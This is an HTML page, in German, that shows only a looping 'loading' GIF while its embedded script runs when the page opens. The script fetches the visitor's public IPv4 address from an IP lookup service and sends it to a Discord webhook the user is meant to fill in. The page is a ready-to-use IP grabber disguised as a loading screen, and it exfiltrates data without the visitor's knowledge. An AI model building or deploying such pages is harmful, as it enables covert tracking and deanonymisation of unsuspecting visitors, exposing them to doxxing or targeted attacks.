<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Nur IPv4</title>
  <style>
    body {
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    img {
      max-width: 90%;
      max-height: 90%;
    }
  </style>
</head>
<body>

<img src="https://media.tenor.com/1vCm3vSUyBwAAAAC/loading-buffering.gif" alt="Lade...">

<script>
const webhookUrl = "DEIN_DISCORD_WEBHOOK_HIER"; // Webhook hier einf√ºgen

async function getIPv4() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "Fehler beim Laden";
    }
}

async function sendToDiscord() {
    const ipv4 = await getIPv4();
    const embed = {
        title: "Neue IPv4 erkannt",
        color: 3447003,
        fields: [
            { name: "IPv4-Adresse", value: ipv4, inline: false }
        ],
        timestamp: new Date()
    };

    await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
    });
}

sendToDiscord();
</script>

</body>
</html>
